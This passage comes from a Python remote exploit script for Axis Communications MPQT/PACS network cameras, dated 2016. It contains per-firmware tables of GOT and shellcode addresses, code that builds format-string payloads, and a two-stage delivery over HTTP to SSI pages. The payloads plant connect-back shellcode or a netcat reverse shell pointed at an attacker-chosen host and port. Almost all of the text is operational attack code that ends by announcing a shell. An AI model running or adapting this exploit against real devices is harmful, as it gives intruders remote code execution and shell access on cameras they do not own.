                        0x41e700,       # .bss shellcode address
                        3,              # 1st POP's
                        13,             # 2nd POP's
                        'axi',          # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # PACS
        'MIPS-1.3x': [
                        0x41e4cc,       # Adjust to GOT free() address
                        0x420a78,       # .bss shellcode address
                        7,              # 1st POP's
                        11,             # 2nd POP's
                        'axis',         # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

        # PACS
        'MIPS-1.1x': [
                        0x41e268,       # Adjust to GOT free() address
                        0x420818,       # .bss shellcode address
                        7,              # 1st POP's
                        11,             # 2nd POP's
                        'axis',         # Aligns injected code
                        700,            # How big buffer before shellcode
                        'MIPSel'        # Shellcode type
        ],

#
# Tested with execstack to set executable stack flag bit on bin's and lib's
#
# These two 'Old Style' are not used in the exploit, but kept here as reference as they has been confirmed working.
#

        # ARMel with bin/libs executable stack flag set with 'execstack'
        # MPQT
        'ARM-5.50x': [                  #
                        0x1c1b4,        # Adjust to GOT free() address
                        0x1e7c8,        # .bss shellcode address
                        93,             # 1st POP's
                        1,              # 2nd POP's
                        'axis',         # Aligns injected code
                        700,            # How big buffer before shellcode
                        'ARMel'         # Shellcode type (ARMel)
        ],

        # ARMel with bin/libs executable stack flag set with 'execstack'
        # MPQT
        'ARM-5.55x': [                  #
                        0x1c15c,        # Adjust to GOT free() address
                        0x1e834,        # .bss shellcode address
                        59,             # 1st POP's
                        80,             # 2nd POP's
                        'axis',         # Aligns injected code
                        800,            # How big buffer before shellcode
                        'ARMel'         # Shellcode type (ARMel)
        ],

#
# Using direct parameter access format string, AKA 'New Style'
#
        # MPQT
        'ARM-NCSH-5.20x': [             # AXIS P1311 5.20 (id=root)
                        0x1c1b4,        # Adjust to GOT free() address
                        0x10178,        # Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
                        61,             # 1st POP's
                        115,            # 2nd POP's
                        143,            # 3rd POP's
                        118,            # 4th POP's
                        'NCSH2'         # Shellcode type (Netcat Shell)
        ],

        # MPQT
        'ARM-NCSH-5.2x': [              #
                        0x1c1b4,        # Adjust to GOT free() address
                        0x1013c,        # Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
                        61,             # 1st POP's
                        115,            # 2nd POP's
                        143,            # 3rd POP's
                        118,            # 4th POP's
                        'NCSH2'         # Shellcode type (Netcat Shell)
        ],

        # MPQT
        'ARM-NCSH-5.4x': [              #
                        0x1c1b4,        # Adjust to GOT free() address
                        0x101fc,        # Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
                        61,             # 1st POP's
                        115,            # 2nd POP's
                        143,            # 3rd POP's
                        118,            # 4th POP's
                        'NCSH2'         # Shellcode type (Netcat Shell)
        ],
#
# Using POP format string, AKA 'Old Style'
#

        # MPQT
        'ARM-NCSH-5.5x': [              #
                        0x1c15c,        # Adjust to GOT free() address
                        0xfdcc,         # Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
                        97,             # 1st POP's
                        0,              # 2nd POP's
                        41,             # 3rd POP's
                        0,              # 4th POP's
                        'NCSH1'         # Shellcode type (Netcat Shell)
        ],

        # MPQT
        'ARM-NCSH-5.6x': [              #
                        0x1c15c,        # Adjust to GOT free() address
                        0xfcec,         # Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
                        97,             # 1st POP's
                        0,              # 2nd POP's
                        41,             # 3rd POP's
                        0,              # 4th POP's
                        'NCSH1'         # Shellcode type (Netcat Shell)
        ],

        # MPQT
        'ARM-NCSH-5.7x': [              #
                        0x1c1c0,        # Adjust to GOT free() address
                        0xf800,         # Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
                        132,            # 1st POP's
                        0,              # 2nd POP's
                        34,             # 3rd POP's
                        0,              # 4th POP's
                        'NCSH1'         # Shellcode type (Netcat Shell)
        ],

        # Will go in endless loop after exit of nc shell... DoS sux
        # MPQT
        'ARM-NCSH-5.8x': [              #
                        0x1b39c,        # Adjust to GOT free() address
                        0xf8c0,         # Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
                        98,             # 1st POP's
                        0,              # 2nd POP's
                        34,             # 3rd POP's
                        1,              # 4th POP's
                        'NCSH1'         # Shellcode type (Netcat Shell)
        ],

        # MPQT
        'ARM-NCSH-6.1x': [              #
                        0x1d2a4,        # Adjust to GOT free() address
#                               0xecc4,         # Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
                        0xecc8,         # Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
                        106,            # 1st POP's
                        0,              # 2nd POP's
                        34,             # 3rd POP's
                        1,              # 4th POP's
                        'NCSH1'         # Shellcode type (Netcat Shell)
        ],
#
# Using POP format string, AKA 'Old Style'
#

        # MPQT
        'CRISv32-5.5x': [               #
                        0x8d148,        # Adjust to GOT free() address
                        0x8f5a8,        # .bss shellcode address
                        4,              # 1st POP's
                        13,             # 2nd POP's
                        'axis',         # Aligns injected code
                        470,            # How big buffer before shellcode
                        'CRISv32'       # Shellcode type (Crisv32)
        ],

        # MPQT
        'CRISv32-5.4x': [               #
                        0x8d0e0,        # Adjust to GOT free() address
                        0x8f542,        # .bss shellcode address
                        4,              # 1st POP's
                        13,             # 2nd POP's
                        'axis',         # Aligns injected code
                        470,            # How big buffer before shellcode
                        'CRISv32'       # Shellcode type (Crisv32)
        ],

        # MPQT
        'CRISv32-5.2x': [               #
                        0x8d0b4,        # Adjust to GOT free() address
                        0x8f4d6,        # .bss shellcode address
                        4,              # 1st POP's
                        13,             # 2nd POP's
                        'axis',         # Aligns injected code
                        470,            # How big buffer before shellcode
                        'CRISv32'       # Shellcode type (Crisv32)
        ],

        # MPQT
        'CRISv32-5.20.0': [             #
                        0x8d0e4,        # Adjust to GOT free() address
                        0x8f546,        # .bss shellcode address
                        4,              # 1st POP's
                        13,             # 2nd POP's
                        'axis',         # Aligns injected code
                        470,            # How big buffer before shellcode
                        'CRISv32'       # Shellcode type (Crisv32)
        ]


}

        if self.target == 0:
            return target_db

        if not self.target in target_db:
            print("[!] Unknown FMS key: %s!" % self.target)
            sys.exit(1)

        if self.verbose:
            print("[Verbose] Number of availible FMS keys:",len(target_db))

        return target_db


#
# Validate correctness of HOST, IP and PORT
#
class Validate:

    def __init__(self,verbose):
        self.verbose = verbose

    # Check if IP is valid
    def CheckIP(self,IP):
        self.IP = IP

        ip = self.IP.split('.')
        if len(ip) != 4:
            return False
        for tmp in ip:
            if not tmp.isdigit():
                return False
        i = int(tmp)
        if i < 0 or i > 255:
            return False
        return True

    # Check if PORT is valid
    def Port(self,PORT):
        self.PORT = PORT

        if int(self.PORT) < 1 or int(self.PORT) > 65535:
            return False
        else:
            return True

    # Check if HOST is valid
    def Host(self,HOST):
        self.HOST = HOST

        try:
            # Check valid IP
            socket.inet_aton(self.HOST) # Will generate exeption if we try with FQDN or invalid IP
            # Or we check again if it is correct typed IP
            if self.CheckIP(self.HOST):
                return self.HOST
            else:
                return False
        except socket.error as e:
            # Else check valid DNS name, and use the IP address
            try:
                self.HOST = socket.gethostbyname(self.HOST)
                return self.HOST
            except socket.error as e:
                return False



if __name__ == '__main__':

#
# Help, info and pre-defined values
#
    INFO = '[Axis Communications MPQT/PACS remote exploit 2016 bashis <mcw noemail eu>]'
    HTTP = "http"
    HTTPS = "https"
    proto = HTTP
    verbose = False
    noexploit = False
    lhost = '192.168.0.1'   # Default Local HOST
    lport = '31337'         # Default Local PORT
    rhost = '192.168.0.90'  # Default Remote HOST
    rport = '80'            # Default Remote PORT
    #  Not needed for the SSI exploit, here for possible future usage.
#       creds = 'root:pass'
    creds = False

#
# Try to parse all arguments
#
    try:
        arg_parser = argparse.ArgumentParser(
#               prog=sys.argv[0],
        prog='axis-ssid-PoC.py',
        description=('[*]' + INFO + '\n'))
        arg_parser.add_argument('--rhost', required=False, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
        arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ rport +']')
        arg_parser.add_argument('--lhost', required=False, help='Connect Back Address (IP/FQDN) [Default: '+ lhost +']')
        arg_parser.add_argument('--lport', required=False, help='Connect Back Port [Default: '+ lport + ']')
        arg_parser.add_argument('--fms', required=False, help='Manual FMS key')
        if creds:
            arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ creds + ']')
        arg_parser.add_argument('--https', required=False, default=False, action='store_true', help='Use HTTPS for remote connection [Default: HTTP]')
        arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
        arg_parser.add_argument('--noexploit', required=False, default=False, action='store_true', help='Simple testmode; With --verbose testing all code without exploiting [Default: False]')
        arg_parser.add_argument('--dict', required=False, default=False, action='store_true', help='Print FMS keys and stats from dictionary, additional details with --verbose')
        args = arg_parser.parse_args()
    except Exception as e:
        print(INFO,"\nError: %s\n" % str(e))
        sys.exit(1)

    # We want at least one argument, so print out help
    if len(sys.argv) == 1:
        arg_parser.parse_args(['-h'])

    print("\n[*]",INFO)

    if args.verbose:
        verbose = args.verbose

    # Print out info from dictionary
    if args.dict:
        target = FMSdb(rhost,verbose).FMSkey(0)
        print("[db] Number of FMS keys:",len(target))

        # Print out detailed info from dictionary
        if verbose:

            print("[db] Target details of FMS Keys availible for manual xploiting")
            print("\n[FMS Key]\t[GOT Address]\t[BinSh Address]\t[POP1]\t[POP2]\t[POP3]\t[POP4]\t[Shellcode]")

            for tmp in range(0,len(target)):
                Key = sorted(target.keys())[tmp]
                temp = re.split('[-]',Key)[0:10]

                if temp[1] == 'NCSH':
                    print(Key,'\t','0x{:08x}'.format(target[Key][0]),'\t','0x{:08x}'.format(target[Key][1]),'\t',target[Key][2],'\t',target[Key][3],'\t',target[Key][4],'\t',target[Key][5],'\t',target[Key][6])

            print("\n[FMS Key]\t[GOT Address]\t[BSS Address]\t[POP1]\t[POP2]\t[Align]\t[Buf]\t[Shellcode]")
            for tmp in range(0,len(target)):
                Key = sorted(target.keys())[tmp]
                temp = re.split('[-]',Key)[0:10]

                if temp[1] != 'NCSH':
                    print(Key,'\t','0x{:08x}'.format(target[Key][0]),'\t','0x{:08x}'.format(target[Key][1]),'\t',target[Key][2],'\t',target[Key][3],'\t',len(target[Key][4]),'\t',target[Key][5],'\t',target[Key][6])

            print("\n")
        else:
            print("[db] Target FMS Keys availible for manual xploiting instead of using auto mode:")
            Key = ""
            for tmp in range(0,len(target)):
                Key += sorted(target.keys())[tmp]
                Key += ', '
            print('\n',Key,'\n')
        sys.exit(0)

#
# Check validity, update if needed, of provided options
#
    if args.https:
        proto = HTTPS
        if not args.rport:
            rport = '443'

    if creds and args.auth:
        creds = args.auth

    if args.noexploit:
        noexploit = args.noexploit

    if args.rport:
        rport = args.rport

    if args.rhost:
        rhost = args.rhost

    if args.lport:
        lport = args.lport

    if args.lhost:
        lhost = args.lhost

    # Check if LPORT is valid
    if not Validate(verbose).Port(lport):
        print("[!] Invalid LPORT - Choose between 1 and 65535")
        sys.exit(1)

    # Check if RPORT is valid
    if not Validate(verbose).Port(rport):
        print("[!] Invalid RPORT - Choose between 1 and 65535")
        sys.exit(1)

    # Check if LHOST is valid IP or FQDN, get IP back
    lhost = Validate(verbose).Host(lhost)
    if not lhost:
        print("[!] Invalid LHOST")
        sys.exit(1)

    # Check if RHOST is valid IP or FQDN, get IP back
    rhost = Validate(verbose).Host(rhost)
    if not rhost:
        print("[!] Invalid RHOST")
        sys.exit(1)


#
# Validation done, start print out stuff to the user
#
    if noexploit:
        print("[i] Test mode selected, no exploiting...")
    if args.https:
        print("[i] HTTPS / SSL Mode Selected")
    print("[i] Remote target IP:",rhost)
    print("[i] Remote target PORT:",rport)
    print("[i] Connect back IP:",lhost)
    print("[i] Connect back PORT:",lport)

    rhost = rhost + ':' + rport

#
# FMS key is required into this PoC
#
    if not args.fms:
        print("[!] FMS key is required!")
        sys.exit(1)
    else:
        Key = args.fms
        print("[i] Trying with FMS key:",Key)

#
# Prepare exploiting
#
    # Look up the FMS key in dictionary and return pointer for FMS details to use
    target = FMSdb(rhost,verbose).FMSkey(Key)

    if target[Key][6] == 'NCSH1':
        NCSH1 = target[Key][6]
        NCSH2 = ""
    elif target[Key][6] == 'NCSH2':
        NCSH2 = target[Key][6]
        NCSH1 = ""
    else:
        NCSH1 = ""
        NCSH2 = ""

    if Key == 'ARM-NCSH-5.8x':
        print("\nExploit working, but will end up in endless loop after exiting remote NCSH\nDoS sux, so I'm exiting before that shit....\n\n")
        sys.exit(0)

    print("[i] Preparing shellcode:",str(target[Key][6]))

    # We don't use url encoded shellcode with Netcat shell
    # This is for MIPS/CRISv32 and ARM shellcode
    if not NCSH1 and not NCSH2:
        FMSdata = target[Key][4]                # This entry aligns the injected shellcode

        # Building up the url encoded shellcode for sending to the target,
        # and replacing LHOST / LPORT in shellcode to choosen values

        # part of first 500 decoded bytes will be overwritten during stage #2, and since
        # there is different 'tailing' on the request internally, keep it little more than needed, to be safe.
        # Let it be 0x00, just for fun.
        FMSdata += '%00' * target[Key][5]

        # Connect back IP to url encoded
        ip_hex = '%{:02x} %{:02x} %{:02x} %{:02x}'.format(*map(int, lhost.split('.')))
        ip_hex = ip_hex.split()
        IP1=ip_hex[0];IP2=ip_hex[1];IP3=ip_hex[2];IP4=ip_hex[3];

        # Let's break apart the hex code of LPORT into two bytes
        port_hex = hex(int(lport))[2:]
        port_hex = port_hex.zfill(len(port_hex) + len(port_hex) % 2)
        port_hex = ' '.join(port_hex[i: i+2] for i in range(0, len(port_hex), 2))
        port_hex = port_hex.split()

        if (target[Key][6]) == 'MIPSel':
            # Connect back PORT
            if len(port_hex) == 1:
                PP1 = "%ff"
                PP0 = '%{:02x}'.format((int(port_hex[0],16)-1))
            elif len(port_hex) == 2:
                # Little Endian
                PP1 = '%{:02x}'.format((int(port_hex[0],16)-1))
                PP0 = '%{:02x}'.format(int(port_hex[1],16))
        elif (target[Key][6]) == 'ARMel': # Could be combinded with CRISv32
            # Connect back PORT
            if len(port_hex) == 1:
                PP1 = "%00"
                PP0 = '%{:02x}'.format(int(port_hex[0],16))
            elif len(port_hex) == 2:
                # Little Endian
                PP1 = '%{:02x}'.format(int(port_hex[0],16))
                PP0 = '%{:02x}'.format(int(port_hex[1],16))
        elif (target[Key][6]) == 'CRISv32':
            # Connect back PORT
            if len(port_hex) == 1:
                PP1 = "%00"
                PP0 = '%{:02x}'.format(int(port_hex[0],16))
            elif len(port_hex) == 2:
                # Little Endian
                PP1 = '%{:02x}'.format(int(port_hex[0],16))
                PP0 = '%{:02x}'.format(int(port_hex[1],16))
        else:
            print("[!] Unknown shellcode! (%s)" % str(target[Key][6]))
            sys.exit(1)

        # Replace LHOST / LPORT in URL encoded shellcode
        shell = shellcode_db(rhost,verbose).sc(target[Key][6])
        shell = shell.replace("IP1",IP1)
        shell = shell.replace("IP2",IP2)
        shell = shell.replace("IP3",IP3)
        shell = shell.replace("IP4",IP4)
        shell = shell.replace("PP0",PP0)
        shell = shell.replace("PP1",PP1)
        FMSdata += shell

#
# Calculate the FMS values to be used
#
    # Get pre-defined values
    ALREADY_WRITTEN = 40    # Already 'written' in the daemon before our FMS
#       POP_SIZE = 8
    POP_SIZE = 1

    GOThex = target[Key][0]
    BSShex = target[Key][1]
    GOTint = int(GOThex)

    # 'One-Write-Where-And-What'
    if not NCSH1 and not NCSH2:

        POP1 = target[Key][2]
        POP2 = target[Key][3]

        # Calculate for creating the FMS code
        ALREADY_WRITTEN = ALREADY_WRITTEN + (POP1 * POP_SIZE)
        GOTint = (GOTint - ALREADY_WRITTEN)

        ALREADY_WRITTEN = ALREADY_WRITTEN + (POP2 * POP_SIZE)

        BSSint = int(BSShex)
        BSSint = (BSSint - GOTint - ALREADY_WRITTEN)

#               if verbose:
#                       print "[Verbose] Calculated GOTint:",GOTint,"Calculated BSSint:",BSSint

    # 'Two-Write-Where-And-What' using "New Style"
    elif NCSH2:

        POP1 = target[Key][2]
        POP2 = target[Key][3]
        POP3 = target[Key][4]
        POP4 = target[Key][5]
        POP2_SIZE = 2

        # We need to count higher than provided address for the jump
        BaseAddr = 0x10000 + BSShex

        # Calculate for creating the FMS code
        GOTint = (GOTint - ALREADY_WRITTEN)

        ALREADY_WRITTEN = ALREADY_WRITTEN + GOTint

        # Calculate FirstWhat value
        FirstWhat = BaseAddr - (ALREADY_WRITTEN)

        ALREADY_WRITTEN = ALREADY_WRITTEN + FirstWhat

        # Calculate SecondWhat value, so it always is 0x20300
        SecondWhat = 0x20300 - (ALREADY_WRITTEN + POP2_SIZE)

        shell = shellcode_db(rhost,verbose).sc(target[Key][6])
        shell = shell.replace("LHOST",lhost)
        shell = shell.replace("LPORT",lport)

        FirstWhat = FirstWhat - len(shell)

#               if verbose:
#                       print "[Verbose] Calculated GOTint:",GOTint,"Calculated FirstWhat:",FirstWhat,"Calculated SecondWhat:",SecondWhat


    # 'Two-Write-Where-And-What' using "Old Style"
    elif NCSH1:

        POP1 = target[Key][2]
        POP2 = target[Key][3]
        POP3 = target[Key][4]
        POP4 = target[Key][5]
        POP2_SIZE = 2

        # FirstWhat writes with 4 bytes (Y) (0x0002YYYY)
        # SecondWhat writes with 1 byte (Z) (0x00ZZYYYY)
        if BSShex > 0x10000:
            MSB = 1
        else:
            MSB = 0

        # We need to count higher than provided address for the jump
        BaseAddr = 0x10000 + BSShex

        # Calculate for creating the FMS code
        ALREADY_WRITTEN = ALREADY_WRITTEN + (POP1 * POP_SIZE)

        GOTint = (GOTint - ALREADY_WRITTEN)

        ALREADY_WRITTEN = ALREADY_WRITTEN + GOTint + POP2_SIZE + (POP3 * POP_SIZE)

        # Calculate FirstWhat value
        FirstWhat = BaseAddr - (ALREADY_WRITTEN)

        ALREADY_WRITTEN = ALREADY_WRITTEN + FirstWhat + (POP4 * POP_SIZE)

        # Calculate SecondWhat value, so it always is 0x203[00] or [01]
        SecondWhat = 0x20300 - (ALREADY_WRITTEN) + MSB

        shell = shellcode_db(rhost,verbose).sc(target[Key][6])
        shell = shell.replace("LHOST",lhost)
        shell = shell.replace("LPORT",lport)

        GOTint = GOTint - len(shell)

#               if verbose:
#                       print "[Verbose] Calculated GOTint:",GOTint,"Calculated FirstWhat:",FirstWhat,"Calculated SecondWhat:",SecondWhat

    else:
        print("[!] NCSH missing, exiting")
        sys.exit(1)
#
# Let's start the exploiting procedure
#

#
# Stage one
#
    if NCSH1 or NCSH2:

        # "New Style" needs to make the exploit in two stages
        if NCSH2:
            FMScode = do_FMS(rhost,verbose)
            # Writing 'FirstWhere' and 'SecondWhere'
            # 1st request
            FMScode.AddADDR(GOTint) # Run up to free() GOT address
            #
            # 1st and 2nd "Write-Where"
            FMScode.AddDirectParameterN(POP1)       # Write 1st Where
            FMScode.Add("XX")                       # Jump up two bytes for next address
            FMScode.AddDirectParameterN(POP2)       # Write 2nd Where
            FMSdata = FMScode.FMSbuild()
        else:
            FMSdata = ""

        print("[>] StG_1: Preparing netcat connect back shell to address:",'0x{:08x}'.format(BSShex),"(%d bytes)" % (len(FMSdata)))
    else:
        print("[>] StG_1: Sending and decoding shellcode to address:",'0x{:08x}'.format(BSShex),"(%d bytes)" % (len(FMSdata)))

    # Inject our encoded shellcode to be decoded in MIPS/CRISv32/ARM
    # Actually, any valid and public readable .shtml file will work...
    # (One of the two below seems always to be usable)
    #
    # For NCSH1 shell, we only check if the remote file are readable, for usage in Stage two
    # For NCSH2, 1st and 2nd (Write-Where) FMS comes here, and calculations start after '=' in the url
    #
    try:
        target_url = "/httpDisabled.shtml?user_agent="
        if noexploit:
            target_url2 = target_url
        else:
            target_url2 = "/httpDisabled.shtml?&http_user="

        if NCSH2:
            html = HTTPconnect(rhost,proto,verbose,creds,noexploit).RAW(target_url2 + FMSdata) # Netcat shell
        else:
            html = HTTPconnect(rhost,proto,verbose,creds,noexploit).Send(target_url + FMSdata)
    except urllib2.HTTPError as e:
        if e.code == 404:
            print("[<] Error",e.code,e.reason)
            target_url = "/view/viewer_index.shtml?user_agent="
            if noexploit:
                target_url2 = target_url
            else:
                target_url2 = "/view/viewer_index.shtml?&http_user="
            print("[>] Using alternative target shtml")
            if NCSH2:
                html = HTTPconnect(rhost,proto,verbose,creds,noexploit).RAW(target_url2 + FMSdata) # Netcat shell
            else:
                html = HTTPconnect(rhost,proto,verbose,creds,noexploit).Send(target_url + FMSdata)
    except Exception as e:
        if not NCSH2:
            print("[!] Shellcode delivery failed:",str(e))
            sys.exit(1)
#
# Stage two
#

#
# Building and sending the FMS code to the target
#
    print("[i] Building the FMS code...")

    FMScode = do_FMS(rhost,verbose)

    # This is an 'One-Write-Where-And-What' for FMS
    #
    # Stack Example:
    #
    # Stack content |       Stack address (ASLR)
    #
    # 0x0           |       @0x7e818dbc -> [POP1's]
    # 0x0           |       @0x7e818dc0 -> [free () GOT address]
    # 0x7e818dd0    |       @0x7e818dc4>>>>>+ "Write-Where" (%n)
    # 0x76f41fb8    |       @0x7e818dc8     | -> [POP2's]
    # 0x76f3d70c    |       @0x7e818dcc     | -> [BSS shell code address]
    # 0x76f55ab8    |       @0x7e818dd0<<<<<+ "Write-What" (%n)
    # 0x1           |       @0x7e818dd4
    #
    if not NCSH1 and not NCSH2:
        FMScode.AddPOP(POP1)            # 1st serie of 'Old Style' POP's
        FMScode.AddADDR(GOTint)         # GOT Address
        FMScode.AddWRITEn(1)            # 4 bytes Write-Where
#               FMScode.AddWRITElln(1)          # Easier to locate while debugging as this will write double word (0x00000000004xxxxx)

        FMScode.AddPOP(POP2)            # 2nd serie of 'Old Style' POP's
        FMScode.AddADDR(BSSint)         # BSS shellcode address
        FMScode.AddWRITEn(1)            # 4 bytes Write-What
#               FMScode.AddWRITElln(1)          # Easier to locate while debugging as this will write double word (0x00000000004xxxxx)

    # End of 'One-Write-Where-And-What'


    # This is an 'Two-Write-Where-And-What' for FMS
    #
    # Netcat shell and FMS code in same request, we will jump to the SSI function <!--#exec cmd="xxx" -->
    # We jump over all SSI tagging to end up directly where "xxx" will
    # be the string passed on to SSI exec function ('/bin/sh -c', pipe(), vfork() and execv())
    #
    # The Trick here is to write lower target address, that we will jump to when calling free(),
    # than the FMS has counted up to, by using Two-Write-Where-and-What with two writes to free() GOT
    # address with two LSB writes.
    #
    elif NCSH2:
        #
        # Direct parameter access for FMS exploitation are really nice and easy to use.
        # However, we need to exploit in two stages with two requests.
        # (I was trying to avoid this "Two-Stages" so much as possibly in this exploit developement...)
        #
        # 1. Write "Two-Write-Where", where 2nd is two bytes higher than 1st (this allows us to write to MSB and LSB)
        # 2. Write with "Two-Write-What", where 1st (LSB) and 2nd (MSB) "Write-Where" pointing to.
        #
        # With "new style", we can write with POPs independently as we don't depended of same criteria as in "NCSH1",
        # we can use any regular "Stack-to-Stack" pointer as we can freely choose the POP-and-Write.
        # [Note the POP1/POP2 (low-high) vs POP3/POP4 (high-low) difference.]
        #
        # Stack Example:
        #
        # Stack content |       Stack address (ASLR)
        #
        # 0x7e818dd0    |       @0x7e818dc4>>>>>+ 1st "Write-Where" [@Stage One]
        # 0x76f41fb8    |       @0x7e818dc8     |
        # 0x76f3d70c    |       @0x7e818dcc     |
        # 0x76f55ab8    |       @0x7e818dd0<<<<<+ 1st "Write-What" [@Stage Two]
        # 0x1           |       @0x7e818dd4
        # [....]
        # 0x1c154       |       @0x7e818e10
        # 0x7e818e20    |       @0x7e818e14>>>>>+ 2nd "Write-Where" [@Stage One]
        # 0x76f41fb8    |       @0x7e818e18     |
        # 0x76f3d70c    |       @0x7e818e1c     |
        # 0x76f55758    |       @0x7e818e20<<<<<+ 2nd "Write-What" [@Stage Two]
        # 0x1           |       @0x7e818e24
        #

        FMScode.Add(shell)

        #
        # 1st and 2nd "Write-Where" already done in stage one
        #
        # 1st and 2nd "Write-What"
        #
        FMScode.AddADDR(GOTint + FirstWhat)     # Run up to 0x0002XXXX, write with LSB (0xXXXX) to LSB in target address.
        FMScode.AddDirectParameterN(POP3)       # Write with 4 bytes (we want to zero out in MSB)
        FMScode.AddADDR(SecondWhat + 3)         # Run up to 0x00020300, write with LSB (0xZZ) to lower part of MSB. (0x00ZZXXXX)
        FMScode.AddDirectParameterHHN(POP4)     # Write with one byte 0x000203[00] or 0x000203[01] depending from above calculation

    elif NCSH1:
        # Could use direct argument addressing here, but I like to keep "old style" as well,
        # as it's another interesting concept.
        #
        # Two matching stack contents -> stack address in row w/o or max two POP's between,
        # is needed to write two bytes higher (MSB).
        #
        #
        # Stack Example:
        #
        # Stack Content |       @Stack Address (ASLR)
        #
        # 0x9c          |       @7ef2fde8 -> [POP1's]
        # [....]
        # 0x1           |       @7ef2fdec -> [GOTint address]
        #------
        # 0x7ef2fe84    |       @7ef2fdf0 >>>>>+     Write 'FirstWhere' (%n) [LSB]
        #                       -> 'XX'        |     two bytes (Can be one or two POP's as well, by using %2c or %1c%1c as POPer)
        # 0x7ef2fe8c    |       @7ef2fdf4 >>>>>>>>>+ Write 'SecondWhere' (%n) [MSB]
        # ------                               |   |
        # [....]                -> [POP3's]    |   |
        # 0x7fb99dc     |       @7ef2fe7c      |   |
        # 0x7ef2fe84    |       @7ef2fe80      |   | [Count up to 0x2XXXX]
        # 0x7ef2ff6a    |       @7ef2fe84 <<<<<+   | Write 'XXXX' 'FirstWhat' (%n) (0x0002XXXX))
        #                       -> [POP4's]        |
        # (nil)         |       @7ef2fe88          | [Count up to 0x20300]
        # 0x7ef2ff74    |       @7ef2fe8c <<<<<<<<<+ Write 'ZZ' 'SecondWhat' (%hhn) (0x00ZZXXXX)

        FMScode.Add(shell)

        # Write FirstWhere for 'FirstWhat'
        FMScode.AddPOP(POP1)
        FMScode.AddADDR(GOTint) # Run up to free() GOT address
        FMScode.AddWRITEn(1)

        # Write SecondWhere for 'SecondWhat'
        #
        # This is special POP with 1 byte, we can maximum POP 2!
        #
        # This POP sequence is actually no longer used in this part of exploit, was developed to meet the requirement
        # for exploitation of 5.2.x and 5.40.x, as there needed to be one POP with maximum of two bytes.
        # Kept as reference as we now using direct parameter access AKA 'New Style" for 5.2x/5.4x
        #
        if POP2 != 0:
            # We only want to write 'SecondWhat' two bytes higher at free() GOT
            if POP2 > 2:
                print("POP2 can't be greater than two!")
                sys.exit(1)
            if POP2 == 1:
                FMScode.Add("%2c")
            else:
                FMScode.Add("%1c%1c")
        else:
            FMScode.Add("XX")
        FMScode.AddWRITEn(1)

        # Write FirstWhat pointed by FirstWhere
        FMScode.AddPOP(POP3)            # Old Style POP's
        FMScode.AddADDR(FirstWhat)      # Run up to 0x0002XXXX, write with LSB (0xXXXX) to LSB in target address.
        FMScode.AddWRITEn(1)            # Write with 4 bytes (we want to zero out in MSB)

        # Write SecondWhat pointed by SecondWhere
        FMScode.AddPOP(POP4)            # Old Style POP's
        FMScode.AddADDR(SecondWhat)     # Run up to 0x00020300, write with LSB (0xZZ) to lower part of MSB. (0x00ZZXXXX)
        FMScode.AddWRITEhhn(1)          # Write with one byte 0x000203[00] or 0x000203[01] depending from above calculation

    else:
        sys.exit(1)

    FMSdata = FMScode.FMSbuild()

    print("[>] StG_2: Writing shellcode address to free() GOT address:",'0x{:08x}'.format(GOThex),"(%d bytes)" % (len(FMSdata)))

    # FMS comes here, and calculations start after '=' in the url
    try:
        if NCSH1 or NCSH2:
            html = HTTPconnect(rhost,proto,verbose,creds,noexploit).RAW(target_url2 + FMSdata) # Netcat shell
        else:
            html = HTTPconnect(rhost,proto,verbose,creds,noexploit).Send(target_url2 + FMSdata) # MIPS/CRIS shellcode
    except urllib2.HTTPError as e:
        print("[!] Payload delivery failed:",str(e))
        sys.exit(1)
    except Exception as e:
        # 1st string returned by HTTP mode, 2nd by HTTPS mode
        if str(e) == "timed out" or str(e) == "('The read operation timed out',)":
            print("[i] Timeout! Payload delivered sucessfully!")
        else:
            print("[!] Payload delivery failed:",str(e))
            sys.exit(1)

    if noexploit:
        print("\n[*] Not exploiting, no shell...\n")
    else:
        print("\n[*] All done, enjoy the shell...\n")

#
# [EOF]
#
